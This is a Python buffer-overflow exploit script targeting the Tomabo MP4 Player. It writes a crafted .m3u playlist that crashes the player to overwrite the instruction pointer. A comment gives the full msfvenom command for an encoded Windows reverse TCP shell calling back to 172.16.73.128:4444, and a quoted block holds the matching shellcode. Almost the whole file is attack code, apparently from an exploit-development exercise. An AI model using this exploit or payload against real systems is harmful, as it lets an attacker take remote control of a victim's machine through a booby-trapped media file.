#!/usr/bin/python
 
# How to: Run the code and open the m3u file with the Vulnerable MP4 Player by Tomabo
# Bad Character = 
# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=172.16.73.128 LPORT=4444 -e x86/shikata_ga_nai -b "" -i 3 -f c
 
file ="tomabo_eip_crash.m3u"
 
buf = ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co")

'''
buf += ("\xbe\x54\x81\x76\x95\xda\xd5\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x5f\x83\xe8\xfc\x31\x70\x10\x03\x70\x10\xb6\x74\xcc\xbc\xd6"
"\xfb\xb5\x65\xcf\xdd\xc2\xbd\x1b\x85\x19\x77\x52\x6e\x6f\xd7"
"\x81\x8c\xdf\xc2\x2a\x7a\x23\x0e\xf0\x24\x61\x16\xfb\xa0\xfc"
"\x9b\x29\x5e\x41\x9a\x71\x86\xca\x05\xe7\x12\xc5\x7f\x7a\x57"
"\x37\x6d\xcc\xfa\x2a\xb2\x43\x2d\x24\x82\x01\x89\x83\xb1\x21"
"\x04\xd7\xb2\x6c\xbd\xbf\xfa\x7c\x7a\x36\x34\xdf\x9a\x6d\x93"
"\x64\x9e\x9d\x61\x12\xb0\x32\x3f\x66\xd0\xb8\x92\x92\xff\x46"
"\x16\xf3\x39\x3e\x33\x4d\x3f\x0f\x7e\x0e\x5c\x53\xa1\xab\x78"
"\xba\x1c\x91\x51\x1f\x50\x95\x9f\x7a\x95\xd2\x23\x26\x89\x9c"
"\x2a\xd2\x65\x1e\x27\x36\x75\x60\x71\x87\x17\x6b\xa2\x05\xb8"
"\x5a\x42\xe7\xf0\xaf\x1e\x58\x6d\x49\x44\x91\x76\x48\xc5\xa2"
"\xb9\x6e\xa5\x76\x59\x92\xaf\x31\xd6\x46\x51\x90\x2e\x1d\xc9"
"\xaa\x34\xd5\xff\xad\x29\x8c\x60\x5b\xe4\xc1\x64\x42\xd8\xb6"
"\x57\x41\x85\x54\xa0\x82\xd7\xf4\xea\x32\xbb\x2c\xdc\x80\xeb"
"\xd3\xe1\x93\x2c\xa3\x3c\x91\x3c\x25\xf7\xbd\x6e\x61\x12\x0f"
"\xe3\x72\xef\xd0\xa1\x90\x7c\xee\x55\x2d\x38\xe5\x60\x9b\x1c"
"\xeb\x10\xc4\x64\x68\xe6\x38\x8e\x47\xc3\x66\xe0\x95\xf9\x29"
"\xe8\xb7\x85\xbe\x36\x56\x7c\x35\xd5\xc6\x02\x4c\xed\xea\x50"
"\x4c\x9f\x52\x73\x53\x62\x3a\x02\x2a\x32\x57\x83\xd2\x5f\xd8"
"\xa8\x7d\x66\xd4\xfe\xf3\xda\x64\xff\xce\x46\x04\xc0\x1c\x87"
"\xa4\xe9\xd4\x17\x80\xdd\x72\xc3\x15\x8d\x5c\x93\x05\xf1\x96"
"\x59\x33\xd2\x19\x98\xf8\x29\xe3\x48\x63\x06\xae\x38\x1c\x3c"
"\xce\x17\x85\x81\x4b\x0f\x1b\x2c\x17\xfb\x51\x52\x26\x53\x85"
"\xf4\x62\x01\x96\x3f\x8e\xe2\x80\xec\x43\x74\xd1\x90\x5e\xab"
"\xb6\xb1\xa5\x1f\xc0\x03\x01\x35\x05\xc1\xd3\x03\x48\x79\xb5"
"\xb0\x33\x5a\x12\x3b\xc3\xde\x19\x6f\xe7\x58\x30\x67\xd1\x1c")
'''

#buf += "D" * (2000 - len(buf))
 
writeFile = open (file, "w")
writeFile.write(buf)
writeFile.close()
